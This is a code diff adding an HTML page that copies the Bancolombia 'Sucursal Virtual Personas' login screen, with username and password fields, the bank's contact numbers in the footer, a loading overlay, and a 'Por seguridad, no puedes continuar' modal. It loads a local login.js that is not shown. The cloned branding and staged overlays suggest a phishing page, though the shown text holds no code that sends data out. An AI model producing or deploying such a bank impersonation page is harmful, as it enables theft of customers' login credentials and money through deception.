@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sucursal Virtual Personas - Bancolombia</title>
+<link rel="stylesheet" href="css/index.css">
+</head>
+<body>
+  <div class="bg-shapes">
+    <svg viewBox="0 0 1500 900" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
+      <path d="M -50,400 Q 200,200 450,450 T 900,400" stroke="#ff8c42" stroke-width="22" fill="none" stroke-linecap="round"/>
+      <path d="M -50,420 Q 250,180 500,460 T 950,420 T 1400,300 T 1600,150" stroke="#fdda24" stroke-width="22" fill="none" stroke-linecap="round"/>
+      <path d="M 950,400 Q 1100,500 1300,300 T 1600,100" stroke="#ff8c42" stroke-width="22" fill="none" stroke-linecap="round"/>
+      <path d="M 1100,250 Q 1300,150 1500,50" stroke="#9b5de5" stroke-width="22" fill="none" stroke-linecap="round"/>
+      <circle cx="490" cy="455" r="14" fill="#9b5de5"/>
+    </svg>
+  </div>
+
+  <main>
+    <div class="logo">
+      <img src="img/horizont-trazo.svg" alt="Bancolombia">
+    </div>
+
+    <h1>Sucursal Virtual Personas</h1>
+
+    <div class="info-box">
+      <div class="info-icon">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M9 18h6"/><path d="M10 22h4"/>
+          <path d="M12 2a7 7 0 0 0-4 12.7c.6.5 1 1.3 1 2.1V18h6v-1.2c0-.8.4-1.6 1-2.1A7 7 0 0 0 12 2Z"/>
+        </svg>
+      </div>
+      <div class="info-content">
+        <strong>¡Prográmate!</strong>
+        <p>Consulta el estado de nuestros canales y los mantenimientos programados.</p>
+        <a href="#">Más info aquí.</a>
+      </div>
+    </div>
+
+    <div class="card">
+      <h2>¡Hola!</h2>
+      <p class="subtitle">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
+
+      <div class="error-msg" id="errorMsg">Usuario o clave incorrectos. Verifica los datos e intenta nuevamente.</div>
+
+      <div class="field">
+        <span class="field-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="8" r="4"/>
+            <path d="M4 21c0-4.4 3.6-8 8-8s8 3.6 8 8"/>
+          </svg>
+        </span>
+        <input type="text" id="user" placeholder="Usuario" autocomplete="username">
+      </div>
+      <a href="#" class="forgot-link">¿Olvidaste tu usuario?</a>
+
+      <div class="field">
+        <span class="field-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="4" y="11" width="16" height="10" rx="2"/>
+            <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+          </svg>
+        </span>
+        <input type="password" id="pass" placeholder="Clave del cajero" autocomplete="current-password">
+      </div>
+      <a href="#" class="forgot-link">¿Olvidaste o bloqueaste tu clave?</a>
+
+      <button class="btn-login" id="btn" disabled>Iniciar sesión</button>
+      <a href="#" class="create-user">Crear usuario</a>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+      <div class="footer-col">
+        <h4>Atención al cliente</h4>
+        <ul>
+          <li>Medellín: (604) 510 9000</li>
+          <li>Bogotá: (601) 343 0000</li>
+          <li>Cali: (602) 554 0505</li>
+          <li>Resto del país: 01 8000 912345</li>
+          <li>Desde celular: #345</li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Servicios</h4>
+        <ul>
+          <li><a href="#">Personas</a></li>
+          <li><a href="#">Empresas</a></li>
+          <li><a href="#">Pagos PSE</a></li>
+          <li><a href="#">Sucursal Telefónica</a></li>
+          <li><a href="#">Defensor del Consumidor</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Seguridad</h4>
+        <ul>
+          <li><a href="#">Tips de seguridad</a></li>
+          <li><a href="#">Reporta un fraude</a></li>
+          <li><a href="#">Política de privacidad</a></li>
+          <li><a href="#">Términos y condiciones</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <h4>Canales</h4>
+        <ul>
+          <li><a href="#">App Personas</a></li>
+          <li><a href="#">Cajeros automáticos</a></li>
+          <li><a href="#">Corresponsales bancarios</a></li>
+          <li><a href="#">Sucursales físicas</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <strong>Bancolombia S.A.</strong> – Establecimiento Bancario – Vigilado por la Superintendencia Financiera de Colombia.<br>
+      © 2026 Grupo Bancolombia. Todos los derechos reservados.
+    </div>
+  </footer>
+
+<!-- MODAL CARGANDO -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+      <div class="spinner"></div>
+      <span>Cargando...</span>
+    </div>
+  </div>
+
+  <!-- MODAL 923 -->
+  <div class="modal-overlay" id="modal923">
+    <div class="modal-923">
+      <div class="x-circle">
+        <svg viewBox="0 0 30 30" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="22" y1="8" x2="8" y2="22"/><line x1="8" y1="8" x2="22" y2="22"/></svg>
+      </div>
+      <h3>Por seguridad, no puedes continuar</h3>
+      <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica, elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad.</p>
+      <button class="btn-yellow-full" onclick="close923()">Intentar más tarde</button>
+    </div>
+  </div>
+
+  
+
+<script src="js/login.js"></script>
+</body>
+</html>
